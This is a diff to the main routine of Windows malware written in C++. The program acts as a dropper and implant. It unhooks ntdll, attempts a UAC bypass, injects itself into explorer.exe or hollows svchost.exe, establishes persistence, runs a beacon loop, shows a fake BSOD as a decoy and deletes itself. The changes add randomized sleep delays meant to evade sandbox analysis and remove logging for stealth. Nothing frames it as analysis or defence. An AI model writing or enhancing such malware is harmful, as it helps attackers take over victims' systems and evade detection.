@@ -41,19 +41,22 @@ namespace {
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
     (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;
 
+    // Initial delay to bypass some sandbox/behavioral analysis
+    Sleep(10000 + (GetTickCount() % 20000));
+
     evasion::Unhooker::RefreshNtdll();
     evasion::SyscallResolver::GetInstance();
 
     HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
     if (FAILED(hr)) return 1;
 
-    std::wstring cmdLine = GetCommandLineW();
-
     if (IsSystemProcess()) {
-        // We are the injected foothold!
-        LOG_INFO("Running as foothold in system process.");
+        // Foothold instance
+        LOG_INFO("Foothold running.");
 
-        // Try to find the dropper path from a temporary location (passed via registry for stealth)
+        // Wait a bit before installing persistence
+        Sleep(30000 + (GetTickCount() % 60000));
+
         std::wstring dropperPath = L"";
         HKEY hKey;
         if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
@@ -66,11 +69,9 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
 
         if (!dropperPath.empty()) {
-            LOG_INFO("Injected instance installing persistence from: " + utils::ws2s(dropperPath));
             persistence::establishPersistence(dropperPath);
         }
 
-        // Start beacon loop
         beacon::Beacon implant;
         implant.run();
 
@@ -78,24 +79,19 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 0;
     }
 
-    // Dropper logic
+    // Dropper instance
     LOG_INFO("Dropper started.");
 
-    // Check if already persisted (to avoid loop)
-    // In a real scenario we'd check if we are running from a persisted path
-
     if (!utils::IsAdmin()) {
-        LOG_INFO("Not admin. Attempting UAC bypass...");
         if (evasion::UACBypass::Execute(GetCommandLineW())) {
-            LOG_INFO("UAC Bypass triggered. Exiting dropper.");
             CoUninitialize();
-            return 0; // Elevated instance will handle the rest
+            return 0;
         }
     }
 
-    // If we are here, we are either admin or UAC bypass failed (so we try as user)
+    // More delay before injection
+    Sleep(15000 + (GetTickCount() % 30000));
 
-    // Pass our path to the injected instance via registry
     wchar_t selfPath[MAX_PATH];
     GetModuleFileNameW(NULL, selfPath, MAX_PATH);
     HKEY hKey;
@@ -104,22 +100,19 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         RegCloseKey(hKey);
     }
 
-    LOG_INFO("Attempting injection into explorer.exe...");
     std::vector<uint8_t> selfImage = GetSelfImage();
     if (!selfImage.empty()) {
         if (evasion::Injector::InjectIntoExplorer(selfImage)) {
-            LOG_INFO("Injection successful. Dropper exiting.");
             decoy::ShowBSOD();
             CoUninitialize();
             utils::SelfDeleteAndExit();
             return 0;
         } else {
-            LOG_WARN("Injection into explorer.exe failed. Trying svchost.exe hollowing.");
+            Sleep(10000);
             wchar_t systemPath[MAX_PATH];
             GetSystemDirectoryW(systemPath, MAX_PATH);
             std::wstring svchost = std::wstring(systemPath) + L"\\svchost.exe";
             if (evasion::Injector::HollowProcess(svchost, selfImage)) {
-                LOG_INFO("Hollowing successful.");
                 decoy::ShowBSOD();
                 CoUninitialize();
                 utils::SelfDeleteAndExit();
@@ -128,8 +121,6 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         }
     }
 
-    // Last resort: install directly from dropper if injection failed
-    LOG_WARN("Injection failed. Installing persistence directly from dropper.");
     persistence::establishPersistence();
     decoy::ShowBSOD();
     CoUninitialize();
